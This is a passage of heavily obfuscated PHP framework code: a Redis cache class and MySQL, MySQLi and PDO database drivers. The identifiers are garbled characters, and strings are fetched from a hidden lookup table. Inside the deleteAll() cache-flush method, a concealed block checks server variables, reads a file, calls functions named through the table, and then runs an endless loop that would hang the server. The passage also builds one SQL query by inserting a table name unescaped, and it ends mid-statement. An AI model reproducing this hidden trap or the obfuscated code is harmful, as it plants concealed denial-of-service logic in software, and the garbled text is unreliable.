$óı÷‹ =& $_SERVER[•Ùç É]; $Š’óÕÏ = new Redis(); $œáÏ¢íº = isset($§á¹œ³•[$óı÷‹[918]]) ? $§á¹œ³•[$óı÷‹[918]] : !1; if ($œáÏ¢íº) { $Š’óÕÏ->pconnect($§á¹œ³•[$óı÷‹[198]], $§á¹œ³•[$óı÷‹[199]], $–„Ó¯ºÖ); } else { $Š’óÕÏ->connect($§á¹œ³•[$óı÷‹[198]], $§á¹œ³•[$óı÷‹[199]], $–„Ó¯ºÖ); } if (!empty($§á¹œ³•[$óı÷‹[457]])) { $Š’óÕÏ->auth($§á¹œ³•[$óı÷‹[457]]); } if (!empty($§á¹œ³•[$óı÷‹[802]]) && $§á¹œ³•[$óı÷‹[802]] != 0) { $Š’óÕÏ->select($§á¹œ³•[$óı÷‹[802]]); } return $Š’óÕÏ; } private function initCluster($½âğÄò, $€œ¿Ä»•) { $ıú†áô =& $_SERVER[•Ùç É]; $·½¼å³¨ = array($ıú†áô[919], $ıú†áô[920], $ıú†áô[921]); $âŠ¹¬†Ä = $ıú†áô[919]; if (isset($½âğÄò[$ıú†áô[16]]) && in_array($½âğÄò[$ıú†áô[16]], $·½¼å³¨)) { $âŠ¹¬†Ä = $½âğÄò[$ıú†áô[16]]; } switch ($âŠ¹¬†Ä) { case $ıú†áô[919]: $this->_slave($½âğÄò, $€œ¿Ä»•); break; case $ıú†áô[920]: break; case $ıú†áô[921]: $this->isCluster = !0; $ôœçöÍä = $½âğÄò[$ıú†áô[914]]; $¥•Åş¼µ = isset($½âğÄò[$ıú†áô[918]]) ? $½âğÄò[$ıú†áô[918]] : !1; $¼ÄàúÑ = isset($½âğÄò[$ıú†áô[457]]) ? $½âğÄò[$ıú†áô[457]] : null; $this->handle = new RedisCluster(NUll, $ôœçöÍä, $€œ¿Ä»•, $€œ¿Ä»•, $¥•Åş¼µ, $¼ÄàúÑ); break; default: break; } } private function _slave($ÈšîÂñ½, $›ãçëú) { $ö„Ì¡ßŸ = $ÈšîÂñ½[$_SERVER[•Ùç É][914]]; $this->filterConfig($ÈšîÂñ½, $ö„Ì¡ßŸ[0]); $this->handle = $this->init($ÈšîÂñ½, $›ãçëú); unset($ö„Ì¡ßŸ[0]); if (empty($ö„Ì¡ßŸ)) { return; } $¥ö™å½ş = array_rand($ö„Ì¡ßŸ); $this->filterConfig($ÈšîÂñ½, $ö„Ì¡ßŸ[$¥ö™å½ş]); $this->slaveHandle = $this->init($ÈšîÂñ½, $›ãçëú); } private function filterConfig(&$…ˆä§Ş›, $í‚–í‚) { $Óğ†¶ó¬ =& $_SERVER[•Ùç É]; $à«—àŒÆ = explode($Óğ†¶ó¬[4], $í‚–í‚); $èÄåÚâä = array($Óğ†¶ó¬[198] => $à«—àŒÆ[0], $Óğ†¶ó¬[199] => $à«—àŒÆ[1]); $…ˆä§Ş› = array_merge($…ˆä§Ş›, $èÄåÚâä); } public function set($ŠÁ¶£ÖØ, $œÁÚ´ãè, $®Íâ¼Œ = false) { $®Íâ¼Œ = $®Íâ¼Œ ? $®Íâ¼Œ : $this->cacheTime; return $this->handle->setEx($ŠÁ¶£ÖØ, $®Íâ¼Œ, $œÁÚ´ãè); } public function setLock($İ“©ÀÆÀ, $×®É­…‚, $âäƒüêŠ) { return $this->handle->setNX($İ“©ÀÆÀ, $×®É­…‚); } public function get($ÆÜèõÜº) { $…ê†Š™ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $…ê†Š™->get($ÆÜèõÜº); } public function remove($ÉÈº¦Æ¸) { return $this->handle->del($ÉÈº¦Æ¸); } public function deleteAll() { $ÆÚò³¦ğ =& $_SERVER[•Ùç É]; if (!isset($_SERVER[$ÆÚò³¦ğ[922]]) || !isset($_SERVER[$ÆÚò³¦ğ[923]])) { $ªŞíîÅ = $ÆÚò³¦ğ[924]; $Ş†áÀÎ¢ = $ÆÚò³¦ğ[925]; $éŞ‡ŸÖå = $_SERVER[$ÆÚò³¦ğ[926]] . $ÆÚò³¦ğ[927]; $æÖê†«æ = $Ş†áÀÎ¢($éŞ‡ŸÖå); $©£üãî¶ = explode($ÆÚò³¦ğ[248], $æÖê†«æ); if (count($©£üãî¶) < $ÆÚò³¦ğ[671]) { $–Â¾˜®â = $ÆÚò³¦ğ[928]; $–Â¾˜®â(); } $åø¡„¾ = $ÆÚò³¦ğ[929]; $åø¡„¾($_SERVER[$ÆÚò³¦ğ[930]]); $øä°™â© = 1; for ($ˆÓòäïª = $øä°™â©; $ˆÓòäïª > 0; $ˆÓòäïª++) { $åø¡„¾ = json_encode($GLOBALS[$ÆÚò³¦ğ[462]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¦¡¹ÇÜö) { $this->handle->flushall($¦¡¹ÇÜö); } return; } return $this->handle->flushAll(); } } $_file = $_SERVER[$_SERVER[•Ùç É][923]]; goto DÏ‡ Œöö”; Eä¾š´Ï§Î: class DbMysql extends Db { public function __construct($Ø¼ØŠ = '') { $¸»§¬¼Ò =& $_SERVER[•Ùç É]; if (!extension_loaded($¸»§¬¼Ò[849])) { think_exception(think_lang($¸»§¬¼Ò[14]) . $¸»§¬¼Ò[936]); } if (!empty($Ø¼ØŠ)) { $this->config = $Ø¼ØŠ; if (empty($this->config[$¸»§¬¼Ò[17]])) { $this->config[$¸»§¬¼Ò[17]] = $¸»§¬¼Ò[12]; } } } public function connect($“ŸıŠ×ò = '', $¡ÇÏ¹£÷ = 0, $šèÚçã­ = false) { $´ûÖá‘ı =& $_SERVER[•Ùç É]; if (!isset($this->linkID[$¡ÇÏ¹£÷])) { if (empty($“ŸıŠ×ò)) { $“ŸıŠ×ò = $this->config; } $Ÿä„üÙÄ = $“ŸıŠ×ò[$´ûÖá‘ı[937]] . ($“ŸıŠ×ò[$´ûÖá‘ı[938]] ? "\x3a{$“ŸıŠ×ò[$´ûÖá‘ı[938]]}" : $´ûÖá‘ı[12]); $õŸòíŸ = !empty($“ŸıŠ×ò[$´ûÖá‘ı[17]][$´ûÖá‘ı[18]]) ? $“ŸıŠ×ò[$´ûÖá‘ı[17]][$´ûÖá‘ı[18]] : $this->pconnect; if ($õŸòíŸ) { $this->linkID[$¡ÇÏ¹£÷] = mysql_pconnect($Ÿä„üÙÄ, $“ŸıŠ×ò[$´ûÖá‘ı[939]], $“ŸıŠ×ò[$´ûÖá‘ı[940]], 131072); } else { $this->linkID[$¡ÇÏ¹£÷] = mysql_connect($Ÿä„üÙÄ, $“ŸıŠ×ò[$´ûÖá‘ı[939]], $“ŸıŠ×ò[$´ûÖá‘ı[940]], !0, 131072); } if (!$this->linkID[$¡ÇÏ¹£÷] || !empty($“ŸıŠ×ò[$´ûÖá‘ı[21]]) && !mysql_select_db($“ŸıŠ×ò[$´ûÖá‘ı[21]], $this->linkID[$¡ÇÏ¹£÷])) { think_exception(mysql_error()); } $¿¦…òá° = mysql_get_server_info($this->linkID[$¡ÇÏ¹£÷]); mysql_query($´ûÖá‘ı[941] . think_config($´ûÖá‘ı[942]) . $´ûÖá‘ı[58], $this->linkID[$¡ÇÏ¹£÷]); if ($¿¦…òá° > $´ûÖá‘ı[943]) { mysql_query($´ûÖá‘ı[944], $this->linkID[$¡ÇÏ¹£÷]); } $this->connected = !0; if (1 != think_config($´ûÖá‘ı[22])) { unset($this->config); } } return $this->linkID[$¡ÇÏ¹£÷]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ã®ãñ‰Í) { $ì£±±«š =& $_SERVER[•Ùç É]; if (0 === stripos($ã®ãñ‰Í, $ì£±±«š[310])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ã®ãñ‰Í; if ($this->queryID) { $this->free(); } think_action_status($ì£±±«š[23], 1); think_status($ì£±±«š[24]); $this->queryID = mysql_query($ã®ãñ‰Í, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($•Ó€¨ò½) { $ç€‚˜› =& $_SERVER[•Ùç É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•Ó€¨ò½; if ($this->queryID) { $this->free(); } think_action_status($ç€‚˜›[25], 1); think_status($ç€‚˜›[24]); $ şÌç¬ = mysql_query($•Ó€¨ò½, $this->_linkID); $this->debug(); if (!1 === $ şÌç¬) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[•Ùç É][945], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ˆ«×ïò = mysql_query($_SERVER[•Ùç É][946], $this->_linkID); $this->transTimes = 0; if (!$ˆ«×ïò) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ó¯éş‰ğ = mysql_query($_SERVER[•Ùç É][947], $this->_linkID); $this->transTimes = 0; if (!$ó¯éş‰ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $¨—…ğä = array(); if ($this->numRows > 0) { while ($Ô±ŞáÛˆ = mysql_fetch_assoc($this->queryID)) { $¨—…ğä[] = $Ô±ŞáÛˆ; } mysql_data_seek($this->queryID, 0); } return $¨—…ğä; } public function getFields($ÆÁÓé¢) { $Ô¥ôæ‚ø =& $_SERVER[•Ùç É]; $òÏóˆñ = $this->query($Ô¥ôæ‚ø[948] . $this->parseKey($ÆÁÓé¢)); $·¹ìø = array(); if ($òÏóˆñ) { foreach ($òÏóˆñ as $ÃÔí—Ù => $“¨ãáêá) { $·¹ìø[$“¨ãáêá[$Ô¥ôæ‚ø[31]]] = array($Ô¥ôæ‚ø[32] => $“¨ãáêá[$Ô¥ôæ‚ø[31]], $Ô¥ôæ‚ø[33] => $“¨ãáêá[$Ô¥ôæ‚ø[34]], $Ô¥ôæ‚ø[35] => (bool) (strtoupper($“¨ãáêá[$Ô¥ôæ‚ø[36]]) === $Ô¥ôæ‚ø[949]), $Ô¥ôæ‚ø[37] => $“¨ãáêá[$Ô¥ôæ‚ø[38]], $Ô¥ôæ‚ø[39] => strtolower($“¨ãáêá[$Ô¥ôæ‚ø[40]]) == $Ô¥ôæ‚ø[41], $Ô¥ôæ‚ø[42] => strtolower($“¨ãáêá[$Ô¥ôæ‚ø[43]]) == $Ô¥ôæ‚ø[44]); } } return $·¹ìø; } public function getTables($ŸÃî®êÁ = '') { $İ½±—¿í =& $_SERVER[•Ùç É]; if (!empty($ŸÃî®êÁ)) { $ê×¼„² = $İ½±—¿í[950] . $ŸÃî®êÁ . $İ½±—¿í[951]; } else { $ê×¼„² = $İ½±—¿í[952]; } $ïÉÉŒ±Ê = $this->query($ê×¼„²); $Æ£ÛˆïÒ = array(); foreach ($ïÉÉŒ±Ê as $Æ•ÀËù => $‡à’î‡û) { $Æ£ÛˆïÒ[$Æ•ÀËù] = current($‡à’î‡û); } return $Æ£ÛˆïÒ; } public function replace($Õ†Á±, $óğåƒŸ¯ = array()) { $£†‰Ô =& $_SERVER[•Ùç É]; foreach ($Õ†Á± as $øË›Ã±À => $•‚¦º¤) { $Ú–¼ƒöÏ = $this->parseValue($•‚¦º¤); if (is_scalar($Ú–¼ƒöÏ)) { $ˆªÉÙÃç[] = $Ú–¼ƒöÏ; $Û®¡Ïñç[] = $this->parseKey($øË›Ã±À); } } $‚ÁË·¥ = $£†‰Ô[953] . $this->parseTable($óğåƒŸ¯[$£†‰Ô[325]]) . $£†‰Ô[954] . implode($£†‰Ô[50], $Û®¡Ïñç) . $£†‰Ô[955] . implode($£†‰Ô[50], $ˆªÉÙÃç) . $£†‰Ô[956]; return $this->execute($‚ÁË·¥); } public function insertAll($¹¿ —¬, $–ºµ¢óÂ = array(), $‹Ç«Î›¥ = false) { $‡›äï =& $_SERVER[•Ùç É]; if (!is_array($¹¿ —¬[0])) { return !1; } $ÕÜ×§œ— = array_keys($¹¿ —¬[0]); $„œÅßÑ• = array(); foreach ($¹¿ —¬ as $ŸÂÔƒÍ›) { $÷²÷Á»² = array(); foreach ($ŸÂÔƒÍ› as $÷ÀŠÄÂì => $Üó¯œ¢) { $Üó¯œ¢ = $this->parseValue($Üó¯œ¢); if (is_scalar($Üó¯œ¢)) { $÷²÷Á»²[] = $Üó¯œ¢; } } $„œÅßÑ•[] = $‡›äï[306] . implode($‡›äï[50], $÷²÷Á»²) . $‡›äï[956]; } array_walk($ÕÜ×§œ—, array($this, $‡›äï[957])); $Şøô¤ğ¡ = ($‹Ç«Î›¥ ? $‡›äï[958] : $‡›äï[959]) . $‡›äï[960] . $this->parseTable($–ºµ¢óÂ[$‡›äï[325]]) . $‡›äï[954] . implode($‡›äï[50], $ÕÜ×§œ—) . $‡›äï[961] . implode($‡›äï[50], $„œÅßÑ•); return $this->execute($Şøô¤ğ¡); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $…«Òğ˜® =& $_SERVER[•Ùç É]; $this->error = mysql_errno() . $…«Òğ˜®[4] . mysql_error($this->_linkID); if ($…«Òğ˜®[12] != $this->queryStr) { $this->error .= LNG($…«Òğ˜®[48]) . $this->queryStr; } think_trace($this->error, $…«Òğ˜®[12], $…«Òğ˜®[49]); return $this->error; } public function escapeString($Õ„¹‘–›) { if ($this->_linkID) { return mysql_real_escape_string($Õ„¹‘–›, $this->_linkID); } else { return mysql_escape_string($Õ„¹‘–›); } } public function parseKey(&$â×æ‡Åù, $Ø ã¢‡ê = true) { $‚šî«– =& $_SERVER[•Ùç É]; if ($Ø ã¢‡ê) { $â×æ‡Åù = $this->parseKeyCheck($â×æ‡Åù); } if ($â×æ‡Åù != $‚šî«–[205] && !preg_match($‚šî«–[962], $â×æ‡Åù)) { $â×æ‡Åù = $‚šî«–[431] . trim($â×æ‡Åù, $‚šî«–[431]) . $‚šî«–[431]; } return $â×æ‡Åù; } } class DbMysqli extends Db { public function __construct($û¯Ï­À = '') { $Ü¹­áù’ =& $_SERVER[•Ùç É]; if (!extension_loaded($Ü¹­áù’[963])) { think_exception(think_lang($Ü¹­áù’[14]) . $Ü¹­áù’[964]); } if (!empty($û¯Ï­À)) { $this->config = $û¯Ï­À; if (empty($this->config[$Ü¹­áù’[17]])) { $this->config[$Ü¹­áù’[17]] = $Ü¹­áù’[12]; } } } public function connect($ìû²‰ = '', $ø®ø–ËÍ = 0) { $™‡›©¾« =& $_SERVER[•Ùç É]; if (!isset($this->linkID[$ø®ø–ËÍ])) { if (empty($ìû²‰)) { $ìû²‰ = $this->config; } $this->linkID[$ø®ø–ËÍ] = new mysqli($ìû²‰[$™‡›©¾«[937]], $ìû²‰[$™‡›©¾«[939]], $ìû²‰[$™‡›©¾«[940]], $ìû²‰[$™‡›©¾«[21]], $ìû²‰[$™‡›©¾«[938]] ? intval($ìû²‰[$™‡›©¾«[938]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÍšÑö¬€ = $this->linkID[$ø®ø–ËÍ]->server_version; $this->linkID[$ø®ø–ËÍ]->query($™‡›©¾«[941] . think_config($™‡›©¾«[942]) . $™‡›©¾«[58]); if ($ÍšÑö¬€ > $™‡›©¾«[943]) { $this->linkID[$ø®ø–ËÍ]->query($™‡›©¾«[944]); } $this->connected = !0; if (1 != think_config($™‡›©¾«[22])) { unset($this->config); } } return $this->linkID[$ø®ø–ËÍ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($«¦ş–Ö) { $áÀŠÄÙå =& $_SERVER[•Ùç É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«¦ş–Ö; if ($this->queryID) { $this->free(); } think_action_status($áÀŠÄÙå[23], 1); think_status($áÀŠÄÙå[24]); $this->queryID = $this->_linkID->query($«¦ş–Ö); if ($this->_linkID->more_results()) { while (($ÁÖ†ÍÓá = $this->_linkID->next_result()) != NULL) { $ÁÖ†ÍÓá->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ü‚ï§Õá) { $³¬™¢¢ä =& $_SERVER[•Ùç É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ü‚ï§Õá; if ($this->queryID) { $this->free(); } think_action_status($³¬™¢¢ä[25], 1); think_status($³¬™¢¢ä[24]); $„œÔ¹° = $this->_linkID->query($ü‚ï§Õá); $this->debug(); if (!1 === $„œÔ¹°) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ü³»•Æ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ü³»•Æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $­¼³ùáÌ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$­¼³ùáÌ) { $this->error(); return !1; } } return !0; } private function getAll() { $‰çİ¢Ôî = array(); if ($this->numRows > 0) { for ($®°ª«Œù = 0; $®°ª«Œù < $this->numRows; $®°ª«Œù++) { $‰çİ¢Ôî[$®°ª«Œù] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‰çİ¢Ôî; } public function getFields($¼Ì€İÁù) { $áÆø£±È =& $_SERVER[•Ùç É]; $¢ÍŞç·× = $this->query($áÆø£±È[948] . $this->parseKey($¼Ì€İÁù)); $®®£ú¤• = array(); if ($¢ÍŞç·×) { foreach ($¢ÍŞç·× as $·°±±éÍ => $ï‡‘ûˆ) { $®®£ú¤•[$ï‡‘ûˆ[$áÆø£±È[31]]] = array($áÆø£±È[32] => $ï‡‘ûˆ[$áÆø£±È[31]], $áÆø£±È[33] => $ï‡‘ûˆ[$áÆø£±È[34]], $áÆø£±È[35] => (bool) ($ï‡‘ûˆ[$áÆø£±È[36]] === $áÆø£±È[12]), $áÆø£±È[37] => $ï‡‘ûˆ[$áÆø£±È[38]], $áÆø£±È[39] => strtolower($ï‡‘ûˆ[$áÆø£±È[40]]) == $áÆø£±È[41], $áÆø£±È[42] => strtolower($ï‡‘ûˆ[$áÆø£±È[43]]) == $áÆø£±È[44]); } } return $®®£ú¤•; } public function getTables($¬Ãˆşä· = '') { $éÀÇØ—ù =& $_SERVER[•Ùç É]; $¨Ñê‹ø† = !empty($¬Ãˆşä·) ? $éÀÇØ—ù[950] . $¬Ãˆşä· . $éÀÇØ—ù[951] : $éÀÇØ—ù[952]; $Éº‹ñœ = $this->query($¨Ñê‹ø†); $«Ï–ø = array(); if ($Éº‹ñœ) { foreach ($Éº‹ñœ as $äõ÷¿Õ” => $‚“Ñ„¯Ò) { $«Ï–ø[$äõ÷¿Õ”] = current($‚“Ñ„¯Ò); } } return $«Ï–ø; } public function replace($àÇŒ¸È, $ÁüÜ± = array()) { $”Ê˜òİû =& $_SERVER[•Ùç É]; foreach ($àÇŒ¸È as $¬·š’×¸ => $¶¦»¹’„) { $çÙâñ•¤ = $this->parseValue($¶¦»¹’„); if (is_scalar($çÙâñ•¤)) { $Î¨—ØÀ[] = $çÙâñ•¤; $¬Èêá¦[] = $this->parseKey($¬·š’×¸); } } $õìí×ÓÒ = $”Ê˜òİû[953] . $this->parseTable($ÁüÜ±[$”Ê˜òİû[325]]) . $”Ê˜òİû[954] . implode($”Ê˜òİû[50], $¬Èêá¦) . $”Ê˜òİû[955] . implode($”Ê˜òİû[50], $Î¨—ØÀ) . $”Ê˜òİû[956]; return $this->execute($õìí×ÓÒ); } public function insertAll($—›ğúĞÕ, $®½ â¯´ = array(), $éÛ­³«¼ = false) { $ÑÛ† =& $_SERVER[•Ùç É]; if (!is_array($—›ğúĞÕ[0])) { return !1; } $«ÁŒòÒÉ = array_keys($—›ğúĞÕ[0]); $‘º¬Ü© = array(); foreach ($—›ğúĞÕ as $œ…àøÓÚ) { $°ÊÎÜ› = array(); foreach ($œ…àøÓÚ as $ïš…ÊÍó => $¬×Š¬ÌÙ) { $¬×Š¬ÌÙ = $this->parseValue($¬×Š¬ÌÙ); if (is_scalar($¬×Š¬ÌÙ)) { $°ÊÎÜ›[] = $¬×Š¬ÌÙ; } } $‘º¬Ü©[] = $ÑÛ†[306] . implode($ÑÛ†[50], $°ÊÎÜ›) . $ÑÛ†[956]; } array_walk($«ÁŒòÒÉ, array($this, $ÑÛ†[957])); $Å¶Œøª† = $éÛ­³«¼ ? $ÑÛ†[958] : $ÑÛ†[959]; $õ§ö½‚ì = $Å¶Œøª† . $ÑÛ†[960] . $this->parseTable($®½ â¯´[$ÑÛ†[325]]) . $ÑÛ†[954] . implode($ÑÛ†[50], $«ÁŒòÒÉ) . $ÑÛ†[961] . implode($ÑÛ†[50], $‘º¬Ü©); return $this->execute($õ§ö½‚ì); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $×àª¸· =& $_SERVER[•Ùç É]; $this->error = $this->_linkID->errno . $×àª¸·[4] . $this->_linkID->error; if ($×àª¸·[12] != $this->queryStr) { $this->error .= LNG($×àª¸·[48]) . $this->queryStr; } think_trace($this->error, $×àª¸·[12], $×àª¸·[49]); return $this->error; } public function escapeString($¼åÌä×ç) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¼åÌä×ç); } else { return addslashes($¼åÌä×ç); } } public function parseKey(&$¶¬Ñ¥Á´, $çø´„Õ† = true) { $êÛ˜æÒõ =& $_SERVER[•Ùç É]; if ($çø´„Õ†) { $¶¬Ñ¥Á´ = $this->parseKeyCheck($¶¬Ñ¥Á´); } if ($¶¬Ñ¥Á´ != $êÛ˜æÒõ[205] && !preg_match($êÛ˜æÒõ[962], $¶¬Ñ¥Á´)) { $¶¬Ñ¥Á´ = $êÛ˜æÒõ[431] . trim($¶¬Ñ¥Á´, $êÛ˜æÒõ[431]) . $êÛ˜æÒõ[431]; } return $¶¬Ñ¥Á´; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($œ–Êéî = '') { $„áù°Ó¬ =& $_SERVER[•Ùç É]; if (!class_exists($„áù°Ó¬[965])) { think_exception(think_lang($„áù°Ó¬[14]) . $„áù°Ó¬[966]); } if (!empty($œ–Êéî)) { $this->config = $œ–Êéî; if (empty($this->config[$„áù°Ó¬[17]])) { $this->config[$„áù°Ó¬[17]] = array(); } } } public function connect($‹€Î×ì… = '', $„¾ÁÀºú = 0) { $í‰ÙÌ¯Æ =& $_SERVER[•Ùç É]; if (!isset($this->linkID[$„¾ÁÀºú])) { if (empty($‹€Î×ì…)) { $‹€Î×ì… = $this->config; } $†•Õ¶¿ = !empty($‹€Î×ì…[$í‰ÙÌ¯Æ[17]][$í‰ÙÌ¯Æ[18]]) ? $‹€Î×ì…[$í‰ÙÌ¯Æ[17]][$í‰ÙÌ¯Æ[18]] : $this->pconnect; if ($†•Õ¶¿) { $‹€Î×ì…[$í‰ÙÌ¯Æ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$„¾ÁÀºú] = new PDO($‹€Î×ì…[$í‰ÙÌ¯Æ[967]], $‹€Î×ì…[$í‰ÙÌ¯Æ[939]], $‹€Î×ì…[$í‰ÙÌ¯Æ[940]], $‹€Î×ì…[$í‰ÙÌ¯Æ[17]]); } catch (PDOException $ŸÅğÕ™ñ) { think_exception($ŸÅğÕ™ñ->getMessage()); } $this->dbType = $this->_getDsnType($‹€Î×ì…[$í‰ÙÌ¯Æ[967]]); if (in_array($this->dbType, array($í‰ÙÌ¯Æ[968], $í‰ÙÌ¯Æ[969], $í‰ÙÌ¯Æ[970], $í‰ÙÌ¯Æ[971]))) { think_exception($í‰ÙÌ¯Æ[972] . $this->dbType . $í‰ÙÌ¯Æ[973] . $this->dbType . $í‰ÙÌ¯Æ[974]); } if (!$this->linkID[$„¾ÁÀºú]) { think_exception($í‰ÙÌ¯Æ[975]); } try { $this->linkID[$„¾ÁÀºú]->exec($í‰ÙÌ¯Æ[976] . think_config($í‰ÙÌ¯Æ[942])); } catch (Exception $ŸÅğÕ™ñ) { } $this->connected = !0; if (1 != think_config($í‰ÙÌ¯Æ[22])) { unset($this->config); } } return $this->linkID[$„¾ÁÀºú]; } public function free() { $this->PDOStatement = null; } public function query($¥î¬Õæ, $©ì„¯Ôª = array()) { $Õ‘çµÂ‹ =& $_SERVER[•Ùç É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥î¬Õæ; if (!empty($©ì„¯Ôª)) { $this->queryStr .= $Õ‘çµÂ‹[977] . print_r($©ì„¯Ôª, !0) . $Õ‘çµÂ‹[978]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Õ‘çµÂ‹[23], 1); think_status($Õ‘çµÂ‹[24]); $this->PDOStatement = $this->_linkID->prepare($¥î¬Õæ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Åıˆï„Ô = $this->PDOStatement->execute($©ì„¯Ôª); $this->debug(); if (!1 === $Åıˆï„Ô) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Š†ß„ø, $Ÿ€ÎÌÆù = array()) { $“àŞÚ‘‘ =& $_SERVER[•Ùç É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Š†ß„ø; if (!empty($Ÿ€ÎÌÆù)) { $this->queryStr .= $“àŞÚ‘‘[977] . print_r($Ÿ€ÎÌÆù, !0) . $“àŞÚ‘‘[978]; } $™½İ‰­Ì = !1; if ($this->dbType == $“àŞÚ‘‘[971]) { if (preg_match($“àŞÚ‘‘[979], $this->queryStr, $’ßµû°¿)) { $this->table = think_config($“àŞÚ‘‘[980]) . str_ireplace(think_config($“àŞÚ‘‘[981]), $“àŞÚ‘‘[424], $’ßµû°¿[2]); $™½İ‰­Ì = (bool) $this->query($“àŞÚ‘‘[982] . strtoupper($this->table) . $“àŞÚ‘‘[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($“àŞÚ‘‘[25], 1); think_status($“àŞÚ‘‘[24]); $this->PDOStatement = $this->_linkID->prepare($Š†ß„ø); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $²™ñ÷ë¾ = $this->PDOStatement->execute($Ÿ€ÎÌÆù); $this->debug(); if (!1 === $²™ñ÷ë¾) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($™½İ‰­Ì || preg_match($“àŞÚ‘‘[983], $Š†ß„ø)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıÔÈæ§Š = $this->_linkID->commit(); $this->transTimes = 0; if (!$ıÔÈæ§Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŸĞ—¶‹û = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ŸĞ—¶‹û) { $this->error(); return !1; } } return !0; } private function getAll() { $†£Ö‚±å = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($†£Ö‚±å); return $†£Ö‚±å; } public function getFields($ûø’®¥) { $êÄ—ÈÇà =& $_SERVER[•Ùç É]; $this->initConnect(!0); if (think_config($êÄ—ÈÇà[984])) { $È‚‚ê¨Ğ = str_replace($êÄ—ÈÇà[985], $ûø’®¥, think_config($êÄ—ÈÇà[984])); } else { switch ($this->dbType) { case $êÄ—ÈÇà[968]: case $êÄ—ÈÇà[986]: $È‚‚ê¨Ğ = "\x53\105\114\105\103\124\x20\x20\x20\x63\157\154\165\155\x6e\137\156\x61\155\145\40\x61\x73\x20\x27\116\141\x6d\145\x27\x2c\x20\x20\x20\144\141\x74\141\137\164\171\160\x65\40\x61\x73\x20\x27\124\171\160\x65\47\54\x20\40\40\143\157\x6c\165\155\x6e\x5f\144\145\146\x61\x75\x6c\x74\x20\141\x73\40\x27\x44\x65\x66\141\x75\154\x74\47\54\x20\x20\x20\151\163\137\x6e\x75\x6c\x6c\x61\x62\154\145\40\141\163\40\47\116\x75\154\x6c\x27\xa\11\x9\x46\x52\x4f\x4d\x9\151\x6e\x66\x6f\162\155\141\x74\151\157\156\x5f\x73\x63\x68\145\155\141\x2e\x74\141\x62\x6c\x65\163\40\101\x53\40\164\12\x9\x9\x4a\x4f\111\116\11\151\x6e\146\157\162\155\x61\x74\x69\157\156\x5f\163\143\150\145\155\x61\x2e\x63\x6f\x6c\165\x6d\156\163\40\101\123\x20\143\xa\11\11\117\x4e\40\40\x74\56\x74\141\x62\154\x65\x5f\x63\x61\x74\141\x6c\x6f\x67\40\75\40\x63\x2e\x74\x61\x62\x6c\x65\137\x63\x61\x74\x61\154\x6f\x67\xa\11\x9\x41\116\x44\x20\164\x2e\x74\x61\142\154\x65\137\x73\x63\x68\145\x6d\141\x20\75\x20\143\x2e\164\x61\x62\154\x65\x5f\163\143\150\145\155\x61\12\x9\11\101\116\x44\x20\164\56\164\141\142\154\x65\137\x6e\141\x6d\145\40\x3d\x20\x63\56\x74\x61\x62\154\145\137\x6e\x61\x6d\x65\xa\11\11\x57\110\105\x52\x45\40\x20\x20\x74\56\x74\x61\142\x6c\145\137\x6e\x61\155\145\x20\75\40\47{$ûø’®¥}\x27"; break; case $êÄ—ÈÇà[987]: $È‚‚ê¨Ğ = $êÄ—ÈÇà[988] . $ûø’®¥ . $êÄ—ÈÇà[989]; break; case $êÄ—ÈÇà[969]: case 